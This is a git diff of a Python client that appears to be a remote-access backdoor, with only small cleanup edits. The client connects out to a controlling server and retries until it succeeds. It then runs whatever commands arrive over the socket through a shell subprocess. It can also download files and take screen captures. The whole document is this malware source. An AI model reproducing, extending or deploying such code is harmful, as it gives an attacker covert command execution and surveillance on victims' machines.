@@ -1,16 +1,12 @@
 #!/usr/bin/python
 import socket
 import subprocess
-import json
 import os
-import struct
 import utils
 import base64
 import time
 import requests
 from mss import mss
-import os
-
 
 def download(url):
     res = requests.get(url)
@@ -35,6 +31,7 @@ def connection_loop():
             sock.connect(("", PORT))
             print("Connected to server")
             shell(sock)
+            break
         except: 
             print("Error while trying to connect to the server")
             print("Retrying...")
@@ -42,8 +39,8 @@ def connection_loop():
             continue
         finally:
             sock.close()
-
-    print("Maximum tries reached, shutting down client now.")
+        if(i == MAX_TRIES-1):
+            print("Maximum tries reached, shutting down client now.")
 
 def shell(sock):
     while True:
@@ -53,7 +50,7 @@ def shell(sock):
         if cmd == "q":
             continue
         elif cmd == "close":
-            break    
+                break
         elif cmd[:7] == "sendall":
             proc = subprocess.Popen(cmd[8:], shell=True, stdout=subprocess.PIPE,
                                     stderr=subprocess.PIPE, stdin=subprocess.PIPE)
